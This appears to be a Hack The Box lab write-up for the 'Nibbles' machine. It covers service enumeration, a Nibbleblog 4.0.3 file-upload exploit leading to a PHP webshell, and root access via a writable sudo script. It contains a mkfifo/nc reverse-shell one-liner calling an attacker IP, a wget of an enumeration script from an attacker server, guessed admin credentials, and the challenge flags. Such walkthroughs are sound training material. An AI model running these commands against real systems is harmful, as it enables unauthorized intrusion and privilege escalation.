# HTB - Nibbles

#HTB #Nibbles #Nibbleblog #PHP #FileUpload #sudo #Easy

Target: 10.129.200.170

## Services

- 22/tcp  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
- 80/tcp  http   Apache httpd 2.4.18 (Ubuntu) — no page title

## Recon

```bash
nmap -sV --open -oA nibbles_initial_scan 10.129.200.170
# 22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
# 80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))

nmap -p- --open -oA nibbles_full_tcp_scan 10.129.200.170
# 22, 80 only — nothing new on the full sweep

nc -nv 10.129.200.170 80          # no banner

nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.200.170
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.200.170
```

```
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
```

## Findings

**The app is hidden in an HTML comment** — the root page looks empty, but the source gives it away:

```bash
curl 10.129.200.170
# <!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Fingerprint the real app:

```bash
whatweb 10.129.200.170
# Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

whatweb http://10.129.200.170/nibbleblog
# [200 OK] Cookies[PHPSESSID], HTML5, JQuery,
# MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Title[Nibbles - Yum yum]
```

Directory brute:

```bash
gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```

```
/.hta        (403)   /.htaccess   (403)   /.htpasswd   (403)
/admin       (301)   /admin.php   (200) [Size: 1401]
/content     (301)   /index.php   (200) [Size: 2987]
/languages   (301)   /plugins     (301)
/README      (200) [Size: 4628]
/themes      (301)
```

**Version confirmation → known CVE:**

```bash
curl http://10.129.200.170/nibbleblog/README     # version 4.0.3
```

- [Nibbleblog 4.0.3 — Arbitrary File Upload (Metasploit), EDB 38489](https://www.exploit-db.com/exploits/38489) — the exploit targets `/admin.php`, which the brute found.

**Username disclosure** — the user store is world-readable:

```bash
curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint --format -
# username: admin
```

## Creds

- `admin:nibbles` — guessed on the assumption the admin reused the box name.

## Foothold

Authenticated file upload via the **My Image** plugin → PHP webshell:

1. Enumerate every link, page, and input field in the admin panel → the image-upload feature.
2. Upload a PHP shell through it.
3. Locate where the plugin stores it:

```
http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```

```bash
nc -lvnp 9001
# then browse to image.php to trigger the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd ~ && cat user.txt
# 79c03865431abf47b90ef24b9695e148
```

## Privesc

In the user's home, `personal.txt` unzips to a `monitor.sh` script.

Transfer and run enumeration:

```bash
# attacker
python3 -m http.server 8001
# target
wget http://10.10.14.166:8001/linenum.sh
```

```bash
sudo -l      # nibbler may run the monitor script as root
```

The script is writeable — back it up, then append a reverse shell and invoke it under sudo:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.166 9002 >/tmp/f' | tee -a monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

```bash
nc -lvnp 9002      # root
```

## Flags

- user: `79c03865431abf47b90ef24b9695e148`
- root: `de5e5d6619862a8aa5b9b212314e0cdd`

## Users

- `nibbler`
